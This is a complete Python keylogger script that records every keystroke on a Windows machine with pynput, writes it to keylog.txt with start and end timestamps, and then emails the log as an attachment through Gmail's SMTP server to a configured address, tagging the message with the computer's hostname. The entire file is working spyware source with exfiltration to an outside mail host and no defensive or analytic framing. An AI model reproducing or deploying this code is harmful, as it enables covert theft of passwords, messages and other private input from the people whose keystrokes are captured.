from pynput.keyboard import Key, Listener
from datetime import datetime
import smtplib
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import socket
from win10toast import ToastNotifier

EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [L CTRL] + [F12] to stop keylogger
PORT = 465                                  # Specify port number (465 or 587 recommended)
SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server
TO_ADDR = "your_email@domain.com"           # Specify recipient email address
FROM_ADDR = "your_email@domain.com"         # Specify sender email address
PASSWORD = "your_password"                  # Specify sender email account password
HOSTNAME = socket.gethostname()
SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
CONTENT = "see kelog.txt attached"          # Specify email body
active_keys = set()

def log(text):
    with open("keylog.txt", "a") as f:
        f.write(str(text))
        f.close()
        
def email_log():
    msg = MIMEMultipart()
    msg["To"] = TO_ADDR
    msg["From"] = FROM_ADDR
    msg["Subject"] = SUBJECT
    body = MIMEText(CONTENT, "plain")
    msg.attach(body)
    
    file = "keylog.txt"
    with open(file, "r") as f:
        attachment = MIMEApplication(f.read(), Name = basename(file))
        attachment["Content-Disposition"] = "attachment"; file = "{}".format(basename(file))
    msg.attach(attachment)
    
    server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)
    server.login(FROM_ADDR, PASSWORD)
    server.send_message(msg, from_addr = FROM_ADDR, to_addrs = [TO_ADDR])
    print("Email Sent to ", TO_ADDR)
    server.quit()

def on_press(key):
    if key in EXIT_COMBINATION:
        active_keys.add(key)
        if all(k in active_keys for k in EXIT_COMBINATION):
            listener.stop()

    try:
        log(key.char)
    except AttributeError:
        if key == Key.backspace:
            log("\n[BACKSPACE]\n")
        elif key == Key.tab:
            log("\n[TAB]\n")
        elif key == Key.enter:
            log("\n[ENTER]\n")
        elif key == Key.shift:
            pass
        elif key == Key.space:
            log(" ")
        else:
            log("\n" + str(key) + "\n")


def on_release(key):
    pass

# Clear previous log
with open("keylog.txt", "w") as f:
    f.close()

start_date = datetime.now()
start_minute = str(start_date.minute)
if len(start_minute) == 1:
    start_minute = "0" + start_minute

log("-----------------------------\n")
log(f"Start Time: {start_date.hour}:{start_minute} {start_date.month}/{start_date.day}/{start_date.year}\n")
log("-----------------------------\n")

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

end_date = datetime.now()
end_minute = str(end_date.minute)
if len(end_minute) == 1:
    end_minute = "0" + end_minute

log("-----------------------------\n")
log(f"End Time: {end_date.hour}:{end_minute} {end_date.month}/{end_date.day}/{end_date.year}\n")
log("-----------------------------\n")

'''Windows 10 notification when keylogger is stopped.'''
# ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)

email_log()
